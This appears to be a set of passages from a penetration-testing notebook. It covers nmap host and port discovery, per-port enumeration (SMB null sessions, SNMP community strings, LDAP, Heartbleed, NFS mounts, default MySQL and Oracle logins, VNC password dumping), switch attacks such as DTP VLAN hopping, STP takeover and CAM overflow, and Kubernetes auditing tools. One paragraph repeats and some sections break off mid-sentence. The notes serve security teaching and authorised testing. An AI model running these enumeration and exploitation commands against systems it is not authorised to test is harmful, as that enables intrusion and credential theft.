This will be necessary if the network is big. https://www.offensive-security.com/metasploit-unleashed/using-databases/ msfconsole db_nmap ## List hosts and ports services ## List hosts hosts ## Import nmap file db_import /path/to/file ## Export to CSV file services -o file.csv Scan safely # Nmap should not crash applications. It does not send malformed packets. If an application crashes it is because it is badly written. If they do crash the vendor should be alerted and the problem fixed. Use SYN scan (-sS) instead of connect scan (-sT). User-mode applications such as web servers can rarely even detect the former because it is all handled in kernel space and thus the services have no excuse to crash. Version scanning (-sV) and some of our NSE scripts (-sC or --script) risk crashing poorly written applications. Similarly, some buggy operating systems have been reported to crash when OS fingerprinted (-O). Omit these options for particularly sensitive environments or where you do not need the results. Using -T2 or slower (-T1, -T0) timing modes can reduce the chances that a port scan will harm a system, though they slow your scan dramatically. Older Linux boxes had an identd daemon that would block services temporarily if they were accessed too frequently. This could happen in a port scan, as well as during legitimate high-load situations. Slower timing might help here. These slow timing modes should only be used as a last resort because they can slow scans by an order of magnitude or more. Limit the number of ports and machines scanned to the fewest that are required. Every machine scanned has a minuscule chance of crashing, and so cutting the number of machines down improves your odds. Reducing the number of ports scanned reduces the risks to end hosts as well as network devices. Many NAT/firewall devices keep a state entry for every port probe. Most of them expire old entries when the table fills up, but occasional (pathetic) implementations crash instead. Reducing the ports and hosts scanned reduces the number of state entries and thus might help those fragile and defective devices stay up. Discover network # The first thing you need to do is to get to know the network a bit. I usually try to inspect the network traffic a little bit before doing anything. NOTICE, that you will perform a DORA (dicovery, offer, request, ack) over DHCP. Iptables will thus NOT block dhcp-requests. I configure iptables to drop all traffic, to make sure I don't interact with it in any way. iptables -P INPUT DROP iptables -P OUTPUT DROP iptables -P FORWARD DROP ip6tables -P INPUT DROP ip6tables -P OUTPUT DROP ip6tables -P FORWARD DROP NOTICE that when you run wireshark you will see your outgoing traffic even through iptables is droppping it. That is because wireshark is hooked up to the interface before iptables. So you will also see incoming traffic even though iptables drops it. Just connect your machine to the ethernet or wifi, then check what ip-address and netmask you get. ip a wlan0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000 inet 10.10.1.10/24 brd 10.10.1.255 scope global dynamic wlan0 In this example you get a netmask of /24 (255.255.255.0). You can easily see the network range, broadcast address and how many hosts by using sipcalc sipcalc eth0 Discover hosts # Discovering hosts is fundamental. It is not impossible that the network you are on is a /8. That would be 16 million addresses. So we can't send a SYN packet to each port on all those 16 million hosts. That would take forever. In NMAP host discovery actions are called PING SCANS, although they are much more than simple ICMP Pings. The challenge in discovering hosts is that you don't have all the time in the world. So you need to balance between time and result. More time gives you better result (if you port scan each port on all machines for example). You might not have the possibility to scan everything, because the network might be too big. Then you need to first identify all hosts, and then scan those. Disable jost discovery # You can disable host discovery, or ping scans with this flag -Pn If the flag is included nmap will send packets to each host and port no matter what. Independet of if it doesn't exist. This might sometimes be useful if the host is not responding to any of the ping scan techniques, but is in fact open and exposes a port. If you want to be 100% sure that you are not missing any hosts this option might be useful. Exclude hosts # If you have some really critical systems that you don't want to scan. ANd you don't want to get blamed if they go down, you can add an exclude-list --exclude, --excludefile <filename> Another good idea is simply to drop all packets to those IP:s from your iptables rules. Remember to take a tcpdump of all the traffic, this way you can prove that it wasn't you. Perform a dry run # To make sure that you haev added all the target flags correctly, you can always perform a dry run. Nmap will only make reverse DNS resolutions, but not packets are sent to the hosts. For example: nmap -sL 10.0.0.1/25 Discover hosts # Okay, not lets get down to it. Very stealthy - Perform a simple reverse DNS resolution nmap -sL 10.0.0.1/24 This will make a DNS reverse resolution. This is an easy way to discover some hosts through the DNS. Less stealthy - Ping sweep The -sn flag will disable the port scan. It perform a icmp ping, TCP SYN to 443 and TCP ACK to 80, and an ARP scan. nmap -sn 10.0.0.1/24 This is actually a relly good, kind of stealthy command, but still useful. It is equivalent to doing this: nmap -PE -PS443 -PA80 -PP -PE 10.0.0.1/24 Basically, the possibilities you haev to discover a host are the following: - ARP broadcast - ICMP PING - TCP SYN to specified port (80/443) - TCP ACK to specified port (80/443) - UDP PING THe difference an attacker can make i to change the TCP and UDP ports. IP Protocol PING Discover services (ports) # Terminology # Nmap defines the state of a port according to the following: open An application is actively accepting TCP connections or UDP packets on this port. Finding these is often the primary goal of port scanning. Security-minded people know that each open port is an avenue for attack. Attackers and pen-testers want to exploit the open ports, while administrators try to close or protect them with firewalls without thwarting legitimate users. Open ports are also interesting for non-security scans because they show services available for use on the network. Before you get too excited about an open port, note that it is possible that the application is protected with a TCP wrapper (tcpd) or that the application itself is configured to only service approved client IP addresses. Such cases still leave more attack surface than a closed port. closed A closed port is accessible (it receives and responds to Nmap probe packets), but there is no application listening on it. They can be helpful in showing that a host is online and using an IP address (host discovery, or ping scanning), and as part of OS detection. Because closed ports are reachable, they may be worth scanning later in case some open up. Administrators may want to consider blocking such ports with a firewall so they appear in the filtered state, discussed next. filtered Nmap cannot determine whether the port is open because packet filtering prevents its probes from reaching the port. The filtering could be from a dedicated firewall device, router rules, or host-based firewall software. These ports frustrate attackers because they provide so little information. Sometimes they respond with ICMP error messages such as type 3 code 13 (destination unreachable: communication administratively prohibited), but filters that simply drop probes without responding are far more common. This forces Nmap to retry several times just in case the probe was dropped due to network congestion rather than filtering. This sort of filtering slows scans down dramatically. unfiltered The unfiltered state means that a port is accessible, but Nmap is unable to determine whether it is open or closed. Only the ACK scan, which is used to map firewall rulesets, classifies ports into this state. Scanning unfiltered ports with other scan types such as Window scan, SYN scan, or FIN scan, may help resolve whether the port is open. open|filtered Nmap places ports in this state when it is unable to determine whether a port is open or filtered. This occurs for scan types in which open ports give no response. The lack of response could also mean that a packet filter dropped the probe or any response it elicited. So Nmap does not know for sure whether the port is open or being filtered. The UDP, IP protocol, FIN, NULL, and Xmas scans classify ports this way. closed|filtered Port scanning # In order to decrease the traffic perform a host-discovery first. It will decrease the traffic but it will also increase the risk that db_nmap -iL Test network segmentation # Network segmentation is the act of splitting networks into different segmentation. Segmenting the network can server different purposes, for example as a security measure to create strict walls between groups of servers/computers. Segmenting the network can limit the damage from an attack. If the attacker only access for example the client network, and not the servers. It will be more difficult for the attacker to reach critical data. Reasons why network segmentation is a good idea. Improved Security. Network traffic can be isolated and / or filtered to limit and / or prevent access between network segments. Better Access Control. Allow users to only access specific network resources. Improved Monitoring. Provides an opportunity to log events, monitor allowed and denied internal connections, and detect suspicious behavior. Improved Performance. With fewer hosts per subnet, local traffic is minimized. Broadcast traffic can be isolated to the local subnet. Better Containment. When a network issue occurs, its effect is limited to the local subnet. Test # The easy way to test network segmentation is simply to access one segment. Ask someone with knowledge of the network for a host and port on another network segment, and the simply try to connect to that host. Try an ICMP connect SYN Test for VLAN-hopping.

It does not send malformed packets. If an application crashes it is because it is badly written. If they do crash the vendor should be alerted and the problem fixed. Use SYN scan (-sS) instead of connect scan (-sT). User-mode applications such as web servers can rarely even detect the former because it is all handled in kernel space and thus the services have no excuse to crash. Version scanning (-sV) and some of our NSE scripts (-sC or --script) risk crashing poorly written applications. Similarly, some buggy operating systems have been reported to crash when OS fingerprinted (-O). Omit these options for particularly sensitive environments or where you do not need the results. Using -T2 or slower (-T1, -T0) timing modes can reduce the chances that a port scan will harm a system, though they slow your scan dramatically. Older Linux boxes had an identd daemon that would block services temporarily if they were accessed too frequently. This could happen in a port scan, as well as during legitimate high-load situations. Slower timing might help here. These slow timing modes should only be used as a last resort because they can slow scans by an order of magnitude or more. Limit the number of ports and machines scanned to the fewest that are required. Every machine scanned has a minuscule chance of crashing, and so cutting the number of machines down improves your odds. Reducing the number of ports scanned reduces the risks to end hosts as well as network devices. Many NAT/firewall devices keep a state entry for every port probe. Most of them expire old entries when the table fills up, but occasional (pathetic) implementations crash instead.

Enum4linux # Enum4linux can be used to enumerate windows and linux machines with smb-shares. The do all option: enum4linux -a 192.168.1.120 For info about it ere: https://labs.portcullis.co.uk/tools/enum4linux/ rpcclient # You can also use rpcclient to enumerate the share. Connect with a null-session. That is, without a user. This only works for older windows servers. rpcclient -U \"\" 192.168.1.101 Once connected you could enter commands like srvinfo enumdomusers getdompwinfo querydominfo netshareenum netshareenumall Port 143/993 - IMAP # IMAP lets you access email stored on that server. So imagine that you are on a network at work, the emails you recieve is not stored on your computer but on a specific mail-server. So every time you look in your inbox your email-client (like outlook) fetches the emails from the mail-server using imap. IMAP is a lot like pop3. But with IMAP you can access your email from various devices. With pop3 you can only access them from one device. Port 993 is the secure port for IMAP. Port 161 and 162 - SNMP # Simple Network Management Protocol SNMP protocols 1,2 and 2c does not encrypt its traffic. So it can be intercepted to steal credentials. SNMP is used to manage devices on a network. It has some funny terminology. For example, instead of using the word password the word community is used instead. But it is kind of the same thing. A common community-string/password is public. You can have read-only access to the snmp.Often just with the community string public . Common community strings public private community Here is a longer list of common community strings: https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/wordlist-common-snmp-community-strings.txt MIB - Management information base # SNMP stores all teh data in the Management Information Base. The MIB is a database that is organized as a tree. Different branches contains different information. So one branch can be username information, and another can be processes running. The \"leaf\" or the endpoint is the actual data. If you have read-access to the database you can read through each endpoint in the tree. This can be used with snmpwalk. It walks through the whole database tree and outputs the content. snmpwalk # snmpwalk -c public -v1 192.168.1.101 #community string and which version This command will output a lot of information. Way to much, and most of it will not be relevant to us and much we won't understand really. So it is better to request the info that you are interested in. Here are the locations of the stuff that we are interested in: 1.3.6.1.2.1.25.1.6.0 System Processes 1.3.6.1.2.1.25.4.2.1.2 Running Programs 1.3.6.1.2.1.25.4.2.1.4 Processes Path 1.3.6.1.2.1.25.2.3.1.4 Storage Units 1.3.6.1.2.1.25.6.3.1.2 Software Name 1.3.6.1.4.1.77.1.2.25 User Accounts 1.3.6.1.2.1.6.13.1.3 TCP Local Ports Now we can use this to query the data we really want. snmpenum # snmp-check # This is a bit easier to use and with a lot prettier output. snmp-check -t 192.168.1.101 -c public Scan for open ports - Nmap # Since SNMP is using UDP we have to use the -sU flag. nmap -iL ips.txt -p 161,162 -sU --open -vvv -oG snmp-nmap.txt Onesixtyone # With onesixtyone you can test for open ports but also brute force community strings. I have had more success using onesixtyone than using nmap. So better use both. Metasploit # There are a few snmp modules in metasploit that you can use. snmp_enum can show you usernames, services, and other stuff. https://www.offensive-security.com/metasploit-unleashed/snmp-scan/ Port 199 - Smux # Port 389/636 - Ldap # Lightweight Directory Access Protocol. This port is usually used for Directories. Directory her means more like a telephone-directory rather than a folder. Ldap directory can be understood a bit like the windows registry. A database-tree. Ldap is sometimes used to store usersinformation. Ldap is used more often in corporate structure. Webapplications can use ldap for authentication. If that is the case it is possible to perform ldap-injections which are similar to sqlinjections. You can sometimes access the ldap using a anonymous login, or with other words no session. This can be useful becasue you might find some valuable data, about users. ldapsearch -h 192.168.1.101 -p 389 -x -b \"dc=mywebsite,dc=com\" When a client connects to the Ldap directory it can use it to query data, or add or remove. Port 636 is used for SSL. There are also metasploit modules for Windows 2000 SP4 and Windows Xp SP0/SP1 Port 443 - HTTPS # Okay this is only here as a reminder to always check for SSL-vulnerabilities such as heartbleed. For more on how to exploit web-applications check out the chapter on client-side vulnerabilities. Heartbleed # OpenSSL 1.0.1 through 1.0.1f (inclusive) are vulnerable OpenSSL 1.0.1g is NOT vulnerable OpenSSL 1.0.0 branch is NOT vulnerable OpenSSL 0.9.8 branch is NOT vulnerable First we need to investigate if the https-page is vulnerable to heartbleed We can do that the following way. sudo sslscan 192.168.101.1:443 or using a nmap script nmap -sV --script=ssl-heartbleed 192.168.101.8 You can exploit the vulnerability in many different ways. There is a module for it in burp suite, and metasploit also has a module for it. use auxiliary/scanner/ssl/openssl_heartbleed set RHOSTS 192.168.101.8 set verbose true run Now you have a flow of random data, some of it might be of interest to you. CRIME # Breach # Certificate # Read the certificate. - Does it include names that might be useful? - Correct vhost Port 554 - RTSP # RTSP (Real Time Streaming Protocol) is a stateful protocol built on top of tcp usually used for streaming images. Many commercial IP-cameras are running on this port. They often have a GUI interface, so look out for that. Port 587 - Submission # Outgoing smtp-port If Postfix is run on it it could be vunerable to shellshock https://www.exploit-db.com/exploits/34896/ Port 631 - Cups # Common UNIX Printing System has become the standard for sharing printers on a linux-network. You will often see port 631 open in your priv-esc enumeration when you run netstat . You can log in to it here: http://localhost:631/admin You authenticate with the OS-users. Find version. Test cups-config --version . If this does not work surf to http://localhost:631/printers and see the CUPS version in the title bar of your browser. There are vulnerabilities for it so check your searchsploit. Port 993 - Imap Encrypted # The default port for the Imap-protocol. Port 995 - POP3 Encrypten # Port 995 is the default port for the Post Office Protocol . The protocol is used for clients to connect to the server and download their emails locally. You usually see this port open on mx-servers. Servers that are meant to send and recieve email. Related ports: 110 is the POP3 non-encrypted. 25, 465 Port 1025 - NFS or IIS # I have seen them open on windows machine. But nothing has been listening on it. Port 1030/1032/1033/1038 # I think these are used by the RPC within Windows Domains. I have found no use for them so far. But they might indicate that the target is part of a Windows domain. Not sure though.

They run Oracles Intelligent Agent . Port 2049 - NFS # Network file system This is a service used so that people can access certain parts of a remote filesystem. If this is badly configured it could mean that you grant excessive access to users. If the service is on its default port you can run this command to see what the filesystem is sharing showmount -e 192.168.1.109 Then you can mount the filesystem to your machine using the following command mount 192.168.1.109:/ /tmp/NFS mount -t 192.168.1.109:/ /tmp/NFS Now we can go to /tmp/NFS and check out /etc/passwd, and add and remove files. This can be used to escalate privileges if it is not correct configured. Check chapter on Linux Privilege Escalation. Port 2100 - Oracle XML DB # There are some exploits for this, so check it out. You can use the default Oracle users to access to it. You can use the normal ftp protocol to access it. Can be accessed through ftp. Some default passwords here: https://docs.oracle.com/cd/B10501_01/win.920/a95490/username.htm Name: Version: Default logins: sys:sys scott:tiger Port 3268 - globalcatLdap # Port 3306 - MySQL # Always test the following: Username: root Password: root mysql --host=192.168.1.101 -u root -p mysql -h <Hostname> -u root mysql -h <Hostname> -u root@localhost mysql -h <Hostname> -u \"\"@localhost telnet 192.168.0.101 3306 You will most likely see this a lot: ERROR 1130 (HY000): Host '192.168.0.101' is not allowed to connect to this MySQL server This occurs because mysql is configured so that the root user is only allowed to log in from 127.0.0.1.

And then you need to escalate your privilege. One way to do that is to look into the databse and see what users and passwords that are available. Maybe someone is resuing a password? So the first step is to find the login-credencials for the database. Those are usually found in some configuration-file oon the web-server. For example, in joomla they are found in: /var/www/html/configuration.php In that file you find the <?php class JConfig { var $mailfrom = 'admin@example.com'; var $fromname = 'testuser'; var $sendmail = '/usr/sbin/sendmail'; var $password = 'myPassowrd1234'; var $sitename = 'test'; var $MetaDesc = 'Joomla! - the dynamic portal engine and content management system'; var $MetaKeys = 'joomla, Joomla'; var $offline_message = 'This site is down for maintenance. Please check back again soon.'; } Port 3339 - Oracle web interface # Port 3389 - Remote Desktop Protocol # This is a proprietary protocol developed by windows to allow remote desktop.

Port 4555 - RSIP # I have seen this port being used by Apache James Remote Configuration. There is an exploit for version 2.3.2 https://www.exploit-db.com/docs/40123.pdf 5060 / 5061 - SIP # PBX - Public branch exchange A private phone exchange, usually found inside a company for example. Trunk - Connects a PBX with the rest of the telephone-network. Lync is being rebranded to Skype for business. So today it is basically the same thing. Asterix is a software implementation of a PBX. Session Initiation Protocol (SIP). SIP V 2.0 is standardized in RFC 3261: https://tools.ietf.org/html/rfc3261. It has since then changed a bit in other RFCs. SIP communicates over TCP/UDP and SCTP. It uses port 5060 for unencrypted traffic and 5061 for encrypted. SIP is just phones over the IP network. - A Client is usually called a SIP User Agent . In order for one user agent to call another both need to listen on their ports, usually 5060 or 5061. However, how would one user that is trying to call another user know at which IP address that user is at? Flow of a call within a domain # Step 1. Register So the first step for a client is to send the above mentioned registration data to the registrar. So lets say that both our callers boot up their sip-phones. On boot they send their AOR and ip address to the registrar It works like this. When a user boot up its phone/client, that client will send a message to the Registrar . The message contains the device Address of Record (AOA). The AOR has this format: SIP:user@domain . And the client will also send its contact address, ie its ip address. So it will send it like this: sip:1003@company.com sip:192.168.11.1:5060 Step 2. Invitation So when the userA wants to call userB, he sends an INVITE to the LOCATION service, which knows the ip address of userB. So it proxies the call to the userB. Step 3. Response UserB picks up the phone, and his ip-address is sent through the LOCATION service, to UserA. So now userA has userB:s ip address. So the fundamental components here are: Registrar service SIP registry (the database with the clients info) Location Service Flow of a call outside of the domain # So the client registrar his AOR to his local SIP server. The SIP server, or SIP proxy, looks up the AOR for the recipient, but can't find it. So it looks at the domain: 1999@othercompany.se So it performs a lookup to othercompany.se, finds the ip-adress and the direct the INVITE to that server. Calling a non-ip phone # So is it possible to call a non-ip phone? Yes. For that you can use a Signalling gateway. Signall protocol translator. Example of those are SS7. But you need a a translator, that translates from SIP to Public switched telephone netowkr (PSTN). Protocol level analysis # So, let's look at exchange between two user agents/client. This is a scenario where they are on the same network and know each others ip. ALICE is calling BOB. ALice INVITE ----> BOB Alice <---- 100 Trying BOB Alice <---- 180 Ringing BOB Alice <---- 200 OK BOB Alice ACK ----> BOB ALICE DATA <-----> DATA BOB Alice hangs up Alice BYE ----> BOB Alice <---- 200 OK BOB Port 5357 - WSDAPI # Port 5722 - DFSR # The Distributed File System Replication (DFSR) service is a state-based, multi-master file replication engine that automatically copies updates to files and folders between computers that are participating in a common replication group. DFSR was added in Windows Server 2003 R2. I am not sure how what can be done with this port. But if it is open it is a sign that the machine in question might be a Domain Controller. Port 5900 - VNC # VNC is used to get a screen for a remote host. But some of them have some exploits. You can use vncviewer to connect to a vnc-service. Vncviewer comes built-in in Kali. It defaults to port 5900. You do not have to set a username. VNC is run as a specific user, so when you use VNC it assumes that user. Also note that the password is not the user password on the machine. If you have dumped and cracked the user password on a machine does not mean you can use them to log in. To find the VNC password you can use the metasploit/meterpreter post exploit module that dumps VNC passwords background use post/windows/gather/credentials/vnc set session X exploit vncviewer 192.168.1.109 Ctr-alt-del # If you are unable to input ctr-alt-del (kali might interpret it as input for kali). Try shift-ctr-alt-del Metasploit scanner # You can scan VNC for logins, with bruteforce.

This table is called a CAM table. Using this table it can forward traffic without the traffic having to go through a router. Backbone/core/tandem switch is a switch with high capacity located in the physical core of the network. A backbone switch serves to interconnect edge switches. A core switch can sometimes operate on layer 3. Aggregation switches are usually connected to the core switch. It can have routing features as well. A normal port on a core switch might handle up to 10Gbps. You might connect the core switch to the aggregation switches using fiber, since those cables will carry a lot of traffic. The core switch usually server as a gateway to the WAN. Aggregation/distribution switch - basically a switch that servers as a connection between a core switch and an edge switch. Access/edge/normal switch - smaller capacity that are on the edges of the network. Usually used to connect end devices, like a computer. Router - layer 3 device # A router is a layer 3 device. While a switch is a layer 2 device. Therefore you won't find subnets configured on a switch, but you will find it on a router. Since the router deals with layer 3 (IP) VLAN # A VLAN is fundamentally a layer 2 virtual lan. This means that it does not concern IP-addresses, as one might initially think. We usually think of a VLAN as a subnet. But a VLAN is a layer 2 segmentation, and subnet is a layer 3. However, it is common with a one-to-one relationship between a VLAN and a subnet. That is: VLAN 10 is related to 192.168.11.1/24 . This is why you might enter a cisco switch and you won't find subnet information. On cisco router show vlans will show the IP-address. On a switch however show vlans does not exist. A VLAN is simply a tag that is added to each ethernet frame. That is why a switch does not really need to look at traffic above the ethernet frame. This tag is the IEEE 802.1Q header (also known as Dot1q ) of the ethernet frame. However if you sniff the traffic on your computer you will likely not see the Dot1q tag, because it is removed when sent to the end user. It is only used between switches, I think. A basic switch that does not have VLANs enabled will have a default VLAN enabled that contains all the ports of the switch. The default VLAN usually uses the ID 1. A trunk is a network link that carries multiple VLANs. In cisco world the word channel is sometimes used to say trunk. Protocols and terminology # HSRP # Hot Standby Router Protocol (HSRP) is a cisco protocol which provides redudancy for a local subnet. In HSRP two or more routers gives an illusion of one virtual router. It allows you to configure one router to be the active router, and others to be the standby router. All routers in a single HSRP group share a MAC address and IP address. The active router is responsible for forwarding the traffic, if that router fails the standby router takes over. SNMP - Simple Network Management Protocol # SNMP is a protocol used to manage and monitor network devices. SNMP is used to monitor your network. It does this by sending out messages to devices on the network that speak SNMP. These are SNMP get-requests. Managed device - the device that can be queried for information. Agent - the service/agent running on a device that collects the data that can be queried over SNMP. Network Managemet station VRF - Virtual Routing and Forwarding # VRF is used to create many virtual routing tables. A typical example would be ISP's using same router to route traffic for various customers and configure VRF to separate the various customer traffics with the router. Some Network Attacks # VLAN hopping using DTP # Background # A switch has a number of ports. Those ports can be either access port or trunking port . An access port is usually used when connecting a host to the switch. Just like a regular computer. Each access port is assigned one VLAN, and only one. A trunking port is used when conneting two switches or connecting a switch and a router. Trunking ports allow traffic from multiple lans. A trunk port can be configured manually. But there is also a protocol that can do this over the network, Dynamic Trunk Protocol. So, as you can understand the attack is to transform the access port that you are connected to into a trunking port, in order to be able to access other VLANS. So an attack can be performed against ports that are configured to be dynamic desirable , dynamic auto , or trunk mode. A port can be in a number of different states: AUTO - if the port is configured to listen for DTP frames it can convert the port to a trunk port of the other switch decides sends the DTP frame. DESIRABLE - DTP is spoken to the neighbor switch with the desire that the other switch form a trunk. ON - Attack # Since it is a protocol an attacker can simply send a DTP packet and instruct the switch to becomes a trunk. If an attacker is successfull it will turn that port into a trunk. Cisco insecure password type # Background # There exists multiple password types in Cisco. The passwords can be stored in a number of different ways, or Types as cisco calls them. Type 0 is plaintext. Etc. Type 9 is the secure version. Passwords are stored in configurations and can be read with commands like show running-config Username Check that it is using type 9. show running-config | incl username Check that it is using \"secret 9\" HSRP Check for usage of encrypted password for HSRP.

You need to make sure that the password is not superweak. If you run show running-config You can check for passwords and see if they are really weak. They might be encrypted, but if they are of type 7 they can easily be decrypted. BGP For example, with BGP it is possible to configure BGP peer authentication. BGP authentication can be used by entering the neighbor command in cisco. It will look something like this: show running-config neighbor 8.8.9.1 password 7 1511021F0725 Password 7 means that it is is encrypted. But it can easily be decrypted by anyone. It is just to store the password in non-plaintext. But the password will be hashed into MD5 when used with BGP. So if it uses password 7 there is nothing really to complain about, but what you can do is simply decrypt it and check that the password is not very weak. You can do this with this script: https://github.com/theevilbit/ciscot7/blob/master/ciscot7.py SNMP Community string is just another word for password. The default community string is public or private.

STP is used to prevent layer 2 switching loops. It does so by shutting down redudant links. So say you have two links between two switches. STP makes sure that you in fact only have one, so that a packet won't enter into a loop. Redudant links are however important to server at a backup. If two links are active at the same time it will create a loop. If a switch recive a unicast, multicast or broadcast. These frames will be forwarded to all ports on the switch except for the port it recieved the frame on. This means that the frame will be sent to another switch, which will send it back to the first swich. Thereby creating a loop. An infinite loop is sometimes called a broadcast storm . STP activly monitors all links on the network. It uses an algorithm called spanning-tree algorithm in order to find redudant links. The protocol disabled redudant links. STP decides on which switch should be the root bridge. It does this by looking at bridge priority value. On cisco this is always 32768. Root Bridge - The switch that is the root in the spanning tree Root Port - All switches choose a root port. which is the port with the lowest cost to the root bridge. Ports that do not participate in the tree are blocked. In order to implement STP you need to specify your most centralized switch to be the root. This is often the core/backbone switch. Exploit # So since STP is just a protocol that switches uses, and there is no authentication you might see where this is going. An attacker can simply set itself to become the root bridge, this means that the other switches would forward traffic to your host. An attacker can flood the network with BPDU packets advertising that your own host has the lowest bridge cost. You can also advertise your link of having a lower cost. This will direct traffic through you. These attacks can be performed with yersinia . You should probably look up how much traffic might be sent over your link. Note that you might bring down the network if you perform this attack.

CAM overflow attack # Background # Switches work by building a reference table between a switch port and a MAC address. Based on the destination MAC address the switch knows which port to send the traffic to. This table is called context-addressable memory (CAM) table. The switch can only hold a limited amount of MAC addresses in this table. An attacker can abuse this by performing a CAM overflow attack. The attacker mimics the existence of thousdands of random MAC addresses on one (or more) ports. The switch enters all these MAC addresses in the CAM table, and eventually the table overflows. Since the table is full the switch doesn't can't know where to send other traffic, legitimate traffic. So the switch turns into a hub, and sends the traffic out to all hosts that are connected to the switch. This allows an attacker to sniff traffic performed by other users.

That is, is the cluster managed by gcloud (GKE), AWS (EKS), or Microsoft (AKS), or some other cloud-provider? If it is, it's a bit less likely that some of the configuration mistakes are made. It also means that the administrators of the cluster might have less ability to manage the cluster themselves. How much of the cluster that is managed depends on the cloud provider. They might be responsible for updating kubernetes, and configure the Master node, and only let the customer control the worker nodes. In GKE for example, the Control Plane is managed by Gcloud, and the worker nodes are managed by the customer. The Control Plane (Cluster Master/ Master Node) is essentially a black box to the administrator. Another managed kubernetes provider is Rancher. A drawback of using a managed cluster is that you might not have access to all features that is available in a unmanaged cluster. If you run an unmanaged cluster you will have access to the master node, and you will be repsonsible for updating kubernetes. Some terminology # Kubernetes API This API is accessible on port 6443 or 443 (GCE, and other Cloud providers usually run it on port 443, while the default is on 6443) on the master node. It is the API that kubectl uses, and through it you managed the desired state of your cluster. If you have high priviliges to the API you own the cluster. It is with this API that you defined things such as: what pods to run, how many replicas, what network and disk resources you want to make available. The API is the single source of truth. The API is sometimes referred to as kube-apiserver because that is the name of the server running on the Cluster master. Kubernetes Control Plane The Control Plane is in charge of putting your cluster in the state that you configured through the Kubernetes API. The term Control Plane is kind of an umberella term to combine several processes running on the master and worker nodes. The Kubernetes Master is a set of three processes that are running on your Master Node. Those processes are: kube-apiserver , kube-controller-manager , and kube-scheduler . Each non-master node runs the following processes: kubelet and kube-proxy . The kubelet process communicates with the Kubernetes Master. The kube-proxy is a network proxy which reflects Kubernetes networking services on each node. Master node aka Cluster master The master node usually runs these services/processes: kube-apiserver - API Server - Available on port 443 - It communicates with kubelet , available on the worker nodes. The communication is bi-directional. ETCD - Scheduler - In a managed cluster, like GKE, google is responsible to upgrade the Master. But you can also manually upgrade it using gcloud CLI tool. Worker node A cluster typically has at least one or more nodes. When people say nodes they usually refer to these worker nodes. It is sometimes called: cluster node, worker node. A worker node is hardware (or virtualized hardware). You need a dedicated VM to function as your worker node. In GKE the worker nodes are just VM-instances. The worker node usually runs these services/processes: Kubelet - The communication between the kubelet and the kube-apiserver is bi-directional. The communication goes over REST HTTP. cAdvisor - Kube-proxy Pod - The pods are running on the worker node. But it is the kube-apiserver that holds the information about pods, like how many replicas it should have, etc. In managed cluster. Like GKE, you never ssh straight to the worker node. Instead the worker node is administrated through gcloud CLI tool or through the web console. The worker node usually have a few different interfaces. One interface on the kubernetes network, where the pods are. A one interface connected to the gcloud network. Workloads You often hear the concept Workloads mentioned. Kubernetes divides workloads into a few different types.1. Deployments 2. StatefulSets 3. DaemonSets 4. Jobs 5. Cronjobs Namespace Namespaces are a way to divide cluster resources in different groups, or namespaces. This can be useful when you want a user to only be able to access certain resources. Those resources can be put in a specific namespace that only that user has access to. A common usecase would be to create a development and a production namespace. Users interacting with one namespace do not see the content in another namespace. Admission controller You here this term quite a bit. An admission controller intercept objects between the user and the apiserver, kind of. An easy way to understand admission controller is to take the admission controller PodSecurityPolicy as an example. A pods properties is usually defined in a yaml file. And it is then deployed using this command: kubectl apply -f podfile.yaml The specification from the file is sent to the apiserver which then performs its magic and deploys the pod. If you have defined a PodSecurityPolicy the pod you are about to deploy is checked against the PodSecurityPolicy to make sure that the pod adheres to that policy, if it does not the deployment is stopped, and if it adheres to the policy the pod is deployed. There are two types of admission controllers: validating and mutating. Validating just valides the object, and mutating mutates it. There are many other admission controllers: https://kubernetes.io/docs/reference/access-authn-authz/admission-controllers/ Useful kubectl commands # The most important: kubectl api-resources The greatest kubectl flag you will ever see: -v=9 . Incredible verbosity: You will understand exactly what kubectl is actually doing. kubectl -v=9 get pods Components # Etcd Etcd is a service, normally running on port 2379. Its job is to store data related to the cluster. Things such as configuration data, state, and metadata. Etcd is distributed, which means that it usually runs on every cluster node. RBAC RBAC stands for Role-Based Access Control. It is the authorization model used in Kubernetes. It replaced Attribute Based Access Control (ABAC) since version 1.6. RBAC allows the cluster administrator perform granular access control. Specifying what each user and servoce account can do. A user can have a specific role. It is possible to specify which Object a Role should have access to, and which actions (called verbs) theys hould be able to perform. If the cluster is a managed cluster, like GKE, it is possible, and common, to integreate the cloud IAM with kubernetes RBAC. RBAC lets us define what subjects can take what actions on what types of objects, in what namespaces. RBAC is configured by configuring User (Service user or human-user), Roles and RoleBinding. So we can create a user, then a role, and the we will bind the user to that role. This can be done with just one configuration file, for example like this: kubectl create -f user.yaml --- apiVersion: v1 kind: ServiceAccount metadata: name: mynamespace-user namespace: mynamespace --- kind: Role apiVersion: rbac.authorization.k8s.io/v1beta1 metadata: name: mynamespace-user-full-access namespace: mynamespace rules: - apiGroups: [\"\", \"extensions\", \"apps\"] resources: [\"*\"] verbs: [\"*\"] - apiGroups: [\"batch\"] resources: - jobs - cronjobs verbs: [\"*\"] --- kind: RoleBinding apiVersion: rbac.authorization.k8s.io/v1beta1 metadata: name: mynamespace-user-view namespace: mynamespace subjects: - kind: ServiceAccount name: mynamespace-user namespace: mynamespace roleRef: apiGroup: rbac.authorization.k8s.io kind: Role name: mynamespace-user-full-access Tools # There are a number of tools that can facilitate the pentest or audit of a kubernetes network. kube-hunter Url: https://github.com/aquasecurity/kube-hunter The tool can audit from the external perspective or internal. It can perform a passive or active scans. In active scans the tool will actually exploit vulnerabilities. If you run this you may alter the cluster you are testing, so be careful. The tool can perform many checks such as: Passive Hunters: Mount Hunter - /var/log Hunt pods that have write access to host's /var/log. in such case, the pod can traverse read files on the host machine AKS Hunting Hunting Azure cluster deployments using specific known configurations Host Discovery Generates ip adresses to scan, based on cluster/scan type K8s Dashboard Discovery Checks for the existence of a Dashboard Kubelet Discovery Checks for the existence of a Kubelet service, and its open ports Kubelet Secure Ports Hunter Hunts specific endpoints on an open secured Kubelet Kubelet Readonly Ports Hunter Hunts specific endpoints on open ports in the readonly Kubelet server API Server Hunter Checks if API server is accessible Port Scanning Scans Kubernetes known ports to determine open endpoints for discovery It takes the local ip, and scans the entire range for open ports such as: 8001, 8080, 10250, 10255, 30000, 443, 6443, 2379 Certificate Email Hunting Checks for email addresses in kubernetes ssl certificates API Service Discovery Checks for the existence of K8s API Services K8s CVE Hunter Checks if Node is running a Kubernetes version vulnerable to known CVEs Etcd Remote Access Checks for remote availability of etcd, 